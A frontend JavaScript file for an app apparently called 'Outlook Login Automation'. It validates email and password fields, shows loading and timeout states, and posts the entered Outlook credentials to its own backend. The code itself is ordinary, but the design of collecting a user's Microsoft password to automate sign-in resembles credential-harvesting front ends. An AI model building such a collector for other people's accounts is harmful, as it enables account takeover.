// Outlook Login Automation - Frontend JavaScript
document.addEventListener('DOMContentLoaded', function() {
    console.log('Outlook Login Automation App initialized');

    // Initialize Feather icons
    if (typeof feather !== 'undefined') {
        feather.replace();
    }

    // Form validation
    const forms = document.querySelectorAll('.needs-validation');
    Array.from(forms).forEach(form => {
        form.addEventListener('submit', event => {
            if (!form.checkValidity()) {
                event.preventDefault();
                event.stopPropagation();
            }
            form.classList.add('was-validated');
        }, false);
    });

    // Handle sign in button loading state
    const signinBtn = document.getElementById('signinBtn');
    const signinSpinner = document.getElementById('signinSpinner');
    const loginForm = document.getElementById('loginForm');

    if (signinBtn && loginForm) {
        loginForm.addEventListener('submit', function(e) {
            const submitValue = document.activeElement.value;
            if (submitValue === 'Sign in') {
                // Show loading state
                signinSpinner.classList.remove('d-none');
                signinBtn.disabled = true;
                signinBtn.innerHTML = `
                    <span class="spinner-border spinner-border-sm me-2"></span>
                    <i data-feather="log-in" class="me-2"></i>
                    Processing...
                `;

                // Re-initialize feather icons for the new content
                if (typeof feather !== 'undefined') {
                    feather.replace();
                }

                // Prevent multiple submissions
                setTimeout(() => {
                    if (!signinBtn.disabled) return;

                    // Reset button if process takes too long (fallback)
                    signinBtn.disabled = false;
                    signinBtn.innerHTML = `
                        <i data-feather="log-in" class="me-2"></i>
                        Start Automation
                    `;
                    signinSpinner.classList.add('d-none');
                    feather.replace();
                }, 60000); // 60 seconds timeout
            }
        });
    }

    // Email validation enhancement
    const emailInput = document.querySelector('input[name="email"]');
    if (emailInput) {
        emailInput.addEventListener('blur', function() {
            const email = this.value.trim();
            if (email && !isValidEmail(email)) {
                this.setCustomValidity('Please enter a valid email address');
                this.classList.add('is-invalid');
            } else {
                this.setCustomValidity('');
                this.classList.remove('is-invalid');
            }
        });

        emailInput.addEventListener('input', function() {
            this.classList.remove('is-invalid');
            this.setCustomValidity('');
        });
    }

    // Password strength indicator (visual feedback)
    const passwordInput = document.querySelector('input[name="password"]');
    if (passwordInput) {
        passwordInput.addEventListener('input', function() {
            const password = this.value;
            let strength = 0;

            if (password.length >= 8) strength++;
            if (/[A-Z]/.test(password)) strength++;
            if (/[a-z]/.test(password)) strength++;
            if (/[0-9]/.test(password)) strength++;
            if (/[^A-Za-z0-9]/.test(password)) strength++;

            // Remove existing strength indicators
            const existingIndicator = this.parentNode.querySelector('.password-strength');
            if (existingIndicator) {
                existingIndicator.remove();
            }

            if (password.length > 0) {
                const indicator = document.createElement('div');
                indicator.className = 'password-strength mt-1';

                let strengthText = '';
                let strengthClass = '';

                if (strength <= 2) {
                    strengthText = 'Weak';
                    strengthClass = 'text-danger';
                } else if (strength <= 3) {
                    strengthText = 'Medium';
                    strengthClass = 'text-warning';
                } else {
                    strengthText = 'Strong';
                    strengthClass = 'text-success';
                }

                indicator.innerHTML = `
                    <small class="${strengthClass}">
                        <i data-feather="shield" style="width: 14px; height: 14px;"></i>
                        Password strength: ${strengthText}
                    </small>
                `;

                this.parentNode.appendChild(indicator);
                if (typeof feather !== 'undefined') {
                    feather.replace();
                }
            }
        });
    }

    // Auto-dismiss alerts after 5 seconds
    const alerts = document.querySelectorAll('.alert');
    alerts.forEach(alert => {
        if (!alert.querySelector('.btn-close')) return;

        setTimeout(() => {
            const bsAlert = new bootstrap.Alert(alert);
            bsAlert.close();
        }, 5000);
    });

    // Session timeout warning
    let sessionWarningShown = false;
    setTimeout(() => {
        if (!sessionWarningShown) {
            showSessionTimeoutWarning();
            sessionWarningShown = true;
        }
    }, 50 * 60 * 1000); // 50 minutes (10 min before 1 hour session expires)

    // Add keyboard shortcuts
    document.addEventListener('keydown', function(e) {
        // Ctrl/Cmd + Enter to submit form
        if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
            const form = document.querySelector('#loginForm');
            if (form) {
                form.submit();
            }
        }

        // Escape to clear form
        if (e.key === 'Escape') {
            const inputs = document.querySelectorAll('input[type="text"], input[type="email"], input[type="password"]');
            inputs.forEach(input => {
                if (document.activeElement === input) {
                    input.blur();
                }
            });
        }
    });

    // Debug mode detection
    if (window.location.search.includes('debug=1')) {
        enableDebugMode();
    }
});

// Utility functions
function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

function submitToBackend(email, password, retry = false) {
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = '/';

        // Add CSRF token
        const csrfToken = document.querySelector('input[name="csrf_token"]');
        if (csrfToken) {
            const csrfInput = document.createElement('input');
            csrfInput.type = 'hidden';
            csrfInput.name = 'csrf_token';
            csrfInput.value = csrfToken.value;
            form.appendChild(csrfInput);
        }

        // Add email
        const emailInput = document.createElement('input');
        emailInput.type = 'hidden';
        emailInput.name = 'email';
        emailInput.value = email;
        form.appendChild(emailInput);

        // Add password
        const passwordInput = document.createElement('input');
        passwordInput.type = 'hidden';
        passwordInput.name = 'password';
        passwordInput.value = password;
        form.appendChild(passwordInput);

        // Add submit button value
        const submitInput = document.createElement('input');
        submitInput.type = 'hidden';
        submitInput.name = 'submit';
        submitInput.value = retry ? 'Sign in' : 'Sign in';
        form.appendChild(submitInput);

        document.body.appendChild(form);
        form.submit();
    }


function showSessionTimeoutWarning() {
    const alertHtml = `
        <div class="alert alert-warning alert-dismissible fade show position-fixed top-0 start-50 translate-middle-x mt-3" style="z-index: 1050; width: 90%; max-width: 500px;" role="alert">
            <i data-feather="clock" class="me-2"></i>
            <strong>Session Warning:</strong> Your session will expire in 10 minutes. Please complete your current action.
            <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
        </div>
    `;

    document.body.insertAdjacentHTML('afterbegin', alertHtml);
    if (typeof feather !== 'undefined') {
        feather.replace();
    }
}

function enableDebugMode() {
    console.log('Debug mode enabled');

    // Add debug info to console
    console.log('Current session data:', {
        sessionId: document.querySelector('small code')?.textContent,
        currentStep: window.location.search.includes('step=password') ? 'password' : 'email',
        timestamp: new Date().toISOString()
    });

    // Add debug panel
    const debugPanel = document.createElement('div');
    debugPanel.className = 'position-fixed bottom-0 end-0 m-3 p-3 bg-dark border rounded';
    debugPanel.style.zIndex = '1060';
    debugPanel.innerHTML = `
        <h6 class="text-warning mb-2">Debug Mode</h6>
        <div class="small text-muted">
            <div>URL: ${window.location.href}</div>
            <div>User Agent: ${navigator.userAgent.substring(0, 50)}...</div>
            <div>Timestamp: ${new Date().toLocaleString()}</div>
        </div>
        <button class="btn btn-sm btn-outline-secondary mt-2" onclick="this.parentElement.remove()">Close</button>
    `;

    document.body.appendChild(debugPanel);
}

// Cloudflare Turnstile callback
window.onTurnstileLoad = function() {
    console.log('Turnstile loaded successfully');
};

// Error handling for network issues
window.addEventListener('online', function() {
    console.log('Connection restored');
    const offlineAlert = document.querySelector('.offline-alert');
    if (offlineAlert) {
        offlineAlert.remove();
    }
});

window.addEventListener('offline', function() {
    console.log('Connection lost');
    const alertHtml = `
        <div class="offline-alert alert alert-danger position-fixed top-0 start-50 translate-middle-x mt-3" style="z-index: 1050; width: 90%; max-width: 500px;" role="alert">
            <i data-feather="wifi-off" class="me-2"></i>
            <strong>No Internet Connection:</strong> Please check your network connection and try again.
        </div>
    `;

    document.body.insertAdjacentHTML('afterbegin', alertHtml);
    if (typeof feather !== 'undefined') {
        feather.replace();
    }
});

// Performance monitoring
window.addEventListener('load', function() {
    const loadTime = performance.timing.loadEventEnd - performance.timing.navigationStart;
    console.log(`Page loaded in ${loadTime}ms`);

    if (loadTime > 3000) {
        console.warn('Page load time is slower than expected');
    }
});

// Form auto-save (for development/debugging)
if (localStorage.getItem('outlook_automation_debug') === 'true') {
    const emailInput = document.querySelector('input[name="email"]');
    if (emailInput) {
        // Load saved email
        const savedEmail = localStorage.getItem('outlook_automation_email');
        if (savedEmail) {
            emailInput.value = savedEmail;
        }

        // Save email on input
        emailInput.addEventListener('input', function() {
            localStorage.setItem('outlook_automation_email', this.value);
        });
    }
}